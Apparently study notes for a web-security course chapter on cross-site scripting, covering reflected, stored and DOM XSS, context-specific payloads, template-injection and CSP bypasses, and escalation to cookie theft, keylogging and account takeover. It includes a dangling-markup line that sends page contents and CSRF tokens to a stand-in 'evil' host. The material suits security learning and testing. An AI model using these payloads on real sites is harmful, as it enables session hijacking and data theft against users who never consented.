# Ch10: Cross-Site Scripting

Source: `/web-security/cross-site-scripting`. Classic class — overlaps `bug-bounty-bootcamp`/`web-hacking-101`/`xss-cheat-sheet` for payloads; this chapter keeps the Academy's context-driven approach: *the right payload is determined by where your input lands.*

## Mechanism & types

- **Reflected** — input echoed in the immediate response (search, error messages).
- **Stored** — persisted then served to others (comments, profiles, support tickets → blind XSS in admin panels; use an OAST callback when you can't see the firing context).
- **DOM-based** — source→sink in client JS (`ch05-dom-attacks.md`); the server may never see the payload (`#fragment` sources).

PoC discipline: `alert(document.domain)` proves execution context; `alert(document.cookie)` is the classic but cookies may be HttpOnly — then pivot to token theft, forced actions, or keylogging. On real targets prefer the minimal PoC that demonstrates control.

## Contexts — the Academy's core framework

Identify the reflection context first, then choose payload shape:

- **HTML text**: new tags work → `<script>`, `<img onerror>`, `<svg onload>`.
- **Inside an HTML tag attribute**: break out (`" onmouseover=alert(1) x="`) or abuse the attribute itself (`href` with `javascript:` on injectable links).
- **Inside JavaScript**: break out of the string (`';alert(1)//`), or if the script is inside an event handler, HTML-encode rules differ — the parser runs HTML decoding *before* JS decoding, so `&apos;` can break a quoted string.
- **Inside a `<script>`/event-handler with encoding**: angle brackets may be encoded but quotes/backslashes survive → `\'-alert(1)-\'`, `</script>`-breakout variants.
- **Client-side template injection (CSTI)**: AngularJS-era `{{7*7}}`/`{{constructor.constructor('alert(1)')()}}` — sandbox escapes version-dependent.
- **Dangling markup**: no full XSS, but inject an unclosed tag (`<img src='//evil/?`) so the *rest of the page* (including CSRF tokens) is sent to your URL — exfil-adjacent data theft without script execution.
- **jQuery/other sinks**: `$()`, `.html()`, `attr()`, location.hash-driven selectors — version-dependent gadgets (see `ch05` + `xss-cheat-sheet`).

## CSP & evasion

`Content-Security-Policy` restricts script sources/inline. Test: allowed domains you control or can upload to (JSONP endpoints on whitelisted CDNs — `cdn.com/jsonp?callback=alert(1)`), `unsafe-eval`/`unsafe-inline`, missing `object-src`/`base-uri` (inject `<base href>` to redirect relative script loads), nonce reuse/leakage, strict-dynamic trust propagation. CSP report-only = policy not enforced — note it, exploit freely.

## Exploitation (impact escalation)

Session cookie theft (if not HttpOnly) → CSRF token theft → perform arbitrary actions as victim → credential phishing (fake login overlay) → keylogging → defacement → chain into account takeover. Stored + privileged-viewer = worm potential. `xss-cheat-sheet` skill for per-context payload lists; `payloads-all-the-things` for polyglots.

## Lab reference

`https://portswigger.net/web-security/all-labs#cross-site-scripting` — ~30 labs spanning reflected/stored/DOM, every context above, CSP bypasses, dangling markup, and `document.cookie`-theft exploits.
